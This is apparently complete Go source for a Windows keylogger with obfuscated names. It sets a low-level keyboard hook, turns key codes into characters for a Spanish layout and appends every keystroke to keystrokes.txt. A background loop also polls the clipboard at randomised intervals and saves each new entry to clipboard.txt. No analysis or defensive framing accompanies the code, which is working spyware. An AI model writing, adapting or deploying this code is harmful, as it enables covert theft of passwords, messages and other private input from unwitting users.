package main

/*
#cgo LDFLAGS: -L. -lkeyboard_layout
#include "keyboard_layout.h"
*/
import "C"
import (
	"fmt"
	"math/rand"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	_h = 13
	_g = 14
	_q = 0x0100
	_z = 0x0101
	_j = 0x0104
	_k = 0x0105
	_l = 0x0201
	_n = 0x0204
	_m = 0x0207
	_c = 0
	_w = 0x0C0A
	_x = 0x0409
)

var (
	_d  = syscall.NewLazyDLL("user32.dll")
	_f  = syscall.NewLazyDLL("kernel32.dll")
	_y  = _d.NewProc("SetWindowsHookExW")
	_a  = _d.NewProc("CallNextHookEx")
	_e  = _d.NewProc("UnhookWindowsHookEx")
	_t  = _d.NewProc("GetMessageW")
	_b  = _d.NewProc("GetAsyncKeyState")
	_v  = _d.NewProc("OpenClipboard")
	_u  = _d.NewProc("CloseClipboard")
	_i  = _d.NewProc("GetClipboardData")
	_o  = _f.NewProc("GlobalLock")
	_p  = _f.NewProc("GlobalUnlock")
	_s  = 13
	_r  syscall.Handle
	_i2 = false
	_y2 = false
	_x2 = false
	_k2 = false
	_a2 string
	_c2 int
	_a3 string
)

func init() {
	_c2 = int(C.GetKeyboardLayoutID())
	rand.Seed(time.Now().UnixNano())
}

func g1() map[uint32]string {
	return map[uint32]string{
		8: "[Backspace]", 9: "[Tab]", 13: "[Enter]\n", 27: "[Esc]",
		32: " ", 37: "[LeftArrow]", 38: "[UpArrow]", 39: "[RightArrow]", 40: "[DownArrow]",
		91: "[WindowsLeft]", 92: "[WindowsRight]", 93: "[Menu]",
		112: "[F1]", 113: "[F2]", 114: "[F3]", 115: "[F4]", 116: "[F5]", 117: "[F6]",
		118: "[F7]", 119: "[F8]", 120: "[F9]", 121: "[F10]", 122: "[F11]", 123: "[F12]",
		160: "", 161: "", 162: "[CtrlLeft]", 163: "[CtrlRight]",
		164: "[AltLeft]", 165: "",
	}
}

func f1(b1, b2 map[uint32]string) map[uint32]string {
	for k, v := range b2 {
		b1[k] = v
	}
	return b1
}

func f2(a1, b1 bool) map[uint32]string {
	switch _c2 {
	case _w:
		return f1(g1(), f3(a1, b1))
	default:
		return f1(g1(), f3(a1, b1))
	}
}

func f3(b1, b2 bool) map[uint32]string {
	a1 := map[uint32]string{
		48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",
		65: "a", 66: "b", 67: "c", 68: "d", 69: "e", 70: "f", 71: "g", 72: "h", 73: "i", 74: "j",
		75: "k", 76: "l", 77: "m", 78: "n", 79: "o", 80: "p", 81: "q", 82: "r", 83: "s", 84: "t",
		85: "u", 86: "v", 87: "w", 88: "x", 89: "y", 90: "z",
		186: "ñ", 187: "´", 188: ",", 189: "-", 190: ".", 191: "-", 192: "º",
		219: "`", 220: "\\", 221: "ç", 222: "¨",
	}
	if b1 {
		for i := 65; i <= 90; i++ {
			a1[uint32(i)] = string(rune(i))
		}
		a1[48] = ")"
		a1[49] = "!"
		a1[50] = "\""
		a1[51] = "#"
		a1[52] = "$"
		a1[53] = "%"
		a1[54] = "&"
		a1[55] = "/"
		a1[56] = "("
		a1[57] = "="
	}
	if b2 {
		a1[49] = "|"
		a1[52] = "~"
		a1[54] = "¬"
		a1[50] = "@"
		a1[51] = "#"
		a1[92] = "\\"
		if b1 {
			for i := 65; i <= 90; i++ {
				a1[uint32(i)] = string(rune(i - 32))
			}
		}
	}
	return a1
}

func d2(a1 int) bool {
	s, _, _ := _b.Call(uintptr(a1))
	return s&0x8000 != 0
}

func saveToFile(f, d string) {
	s, _ := os.OpenFile(f, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if s != nil {
		s.WriteString(d)
		if d == "\n" {
			s.WriteString("\n")
		}
		s.Close()
	}
}

func f5(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode == _c {
		b := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		if wParam == _q || wParam == _j {
			switch b.VkCode {
			case 160, 161:
				_i2 = true
			case 162:
				if !_y2 {
					_x2 = true
				}
			case 163:
				if !_y2 {
					_x2 = true
				}
			case 164:
				_k2 = true
			case 165:
				_y2 = true
				_x2 = false
			}

			c := f2(_i2, _y2)
			d, ok := c[b.VkCode]
			if ok {
				if d == "\n" {
					saveToFile("keystrokes.txt", _a2)
					_a2 = ""
				} else if d != "[ShiftLeft]" && d != "[ShiftRight]" && d != "[CtrlLeft]" && d != "[CtrlRight]" && d != "[AltLeft]" && d != "[AltGr]" {
					_a2 += d
				}

			}
		} else if wParam == _z || wParam == _k {
			switch b.VkCode {
			case 160, 161:
				_i2 = false
			case 162:
				if !_y2 {
					_x2 = false
				}
			case 163:
				if !_y2 {
					_x2 = false
				}
			case 164:
				_k2 = false
			case 165:
				_y2 = false
			}
		}
	}

	if len(_a2) > 0 {
		saveToFile("keystrokes.txt", _a2)
		_a2 = ""
	}

	result, _, _ := _a.Call(uintptr(_r), uintptr(nCode), wParam, lParam)
	return result
}

func r1() (string, error) {

	r, _, e := _v.Call(0)
	if r == 0 {
		return "", fmt.Errorf("%v", e)
	}
	defer _u.Call()

	h, _, e := _i.Call(uintptr(_s))
	if h == 0 {
		return "", fmt.Errorf("%v", e)
	}

	ptr, _, e := _o.Call(h)
	if ptr == 0 {
		return "", fmt.Errorf("failed to lock: %v", e)
	}
	defer _p.Call(h)

	text := syscall.UTF16ToString((*[1 << 20]uint16)(unsafe.Pointer(ptr))[:])

	return text, nil
}

func f6() {
	for {
		text, e := r1()
		if e == nil && text != _a3 {
			_a3 = text
			saveToFile("clipboard.txt", text)
		}
		time.Sleep(time.Duration(rand.Intn(5)+1) * time.Second)
	}
}

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

func main() {
	go f6()

	keyboardHookProc := syscall.NewCallback(f5)

	hKey, _, err := _y.Call(
		uintptr(_h),
		keyboardHookProc,
		0,
		0,
	)
	if hKey == 0 {
		fmt.Printf("Failed to set hook: %v\n", err) // Imprimimos el error si hKey es 0.
		return
	}
	_r = syscall.Handle(hKey)

	defer _e.Call(uintptr(_r))

	var msg struct {
		hwnd    uintptr
		message uint32
		wParam  uintptr
		lParam  uintptr
		time    uint32
		pt      struct{ x, y int32 }
	}
	for {
		_t.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
	}
}
